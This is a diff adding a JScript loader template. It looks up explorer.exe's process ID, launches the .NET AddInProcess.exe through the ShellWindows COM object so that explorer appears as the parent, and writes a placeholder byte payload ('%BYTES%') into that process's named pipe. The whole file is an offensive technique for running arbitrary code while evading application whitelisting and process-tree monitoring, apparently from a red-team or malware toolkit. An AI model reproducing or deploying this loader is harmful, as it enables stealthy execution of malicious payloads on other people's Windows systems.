@@ -1,0 +1,40 @@
+﻿ function getProc(procName)
+{
+	var e = new Enumerator (GetObject("winmgmts:").InstancesOf("Win32_process"));
+	for (; !e.atEnd(); e.moveNext()) {
+		var p = e.item ();
+		curproc = p.Name.toLowerCase();
+
+		if (curproc == procName) {
+			return p.ProcessId;
+		}
+	}
+	return 0;
+}
+
+var intProcessID = getProc("explorer.exe");
+var ShellWindows = "{9BA05972-F6A8-11CF-A442-00A0C90A8F39}";
+var SW = GetObject("new:" + ShellWindows).Item();
+SW.Document.Application.ShellExecute("AddInProcess.exe", "/guid:32a91b0f-30cd-4c75-be79-ccbd6345de99 /pid:"+ intProcessID, "C:\\Windows\\Microsoft.Net\\Framework64\\v4.0.30319\\", null, 0);
+
+var ct = 0;
+while(ct < 1000000)
+{
+	ct++;
+}
+
+
+var rawData = [
+	%BYTES%
+];
+
+try {
+  var f = new ActiveXObject("Scripting.FileSystemObject");
+  var t = f.CreateTextFile("\\\\.\\pipe\\32a91b0f-30cd-4c75-be79-ccbd6345de99", true, false);
+  for(x in rawData) {
+    t.Write(String.fromCharCode(rawData[x]));
+  }
+  t.Close();
+} catch(e) {
+  alert(e.message);
+}
